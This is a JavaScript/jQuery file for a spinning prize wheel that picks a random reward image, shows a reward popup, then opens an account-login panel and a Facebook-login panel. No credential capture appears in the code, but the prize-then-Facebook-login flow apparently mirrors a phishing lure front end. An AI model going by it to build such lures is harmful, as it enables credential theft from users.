const pzs = {
    0:'img/reward/1.png',
    1:'img/reward/2.png',
    2:'img/reward/4.png',
    3:'img/reward/6.png',
    4:'img/reward/5.png',
    5:'img/reward/3.png',
};

const total_items = 6;
const mjp = 30;
let rh = -1;
let jp = 0;
let spd = 30;
let tmr = 0;
let pz = -1;

function runCircle(){
    $(`[data-order="${rh}"]`).removeClass('is-active');
    rh += 1;
    if(rh > total_items - 1){
        rh = 0;
    }
    $(`[data-order="${rh}"]`).addClass('is-active');
}

function generatepzNumber(){
    return Math.floor(Math.random() * total_items);
}

function controllspd(){
    jp += 1;
    runCircle();
    if( jp > mjp + 10 && pz === rh){
        clearTimeout(tmr);
        $('.open_rewards').fadeIn('slow');
        $('.popup-item').attr('src',pzs[rh]);
        pz = -1 ;
        jp = 0;
    }else{if( jp < mjp ){
        spd -= 5;
    }else if( jp === mjp ){
        const random_number = generatepzNumber();
        pz = random_number;
    }else{
        if(( jp > mjp + 10 ) && pz === (rh + 1 )){
            spd += 600;
        }else{
            spd += 20;
        }
    }

        if(spd < 40){
            spd = 40;
        }
        tmr = setTimeout(controllspd,spd);
    }
}
function init(){
    jp = 0;
    spd = 100;
    pz = -1;
    controllspd();
}

$(document).ready( () => {
    $('#js-start').on('click',init);
    }
);

function close_open_rewards() {
    $('.open_rewards').hide();
}

function open_account_login() {
    $('.open_account_login').show();
    $('.open_rewards').hide();
}

function close_account_login() {
    $('.open_account_login').hide();
    $('.open_rewards').show();
}

function open_facebook() {
    $('.login_facebook').show();
    $('.open_account_login').hide();
}


function close_facebook() {
    $('.login_facebook').hide();
    $('.open_account_login').show();
}

function aClick() {
    var audio = document.getElementById('aClick');
    audio.play();
}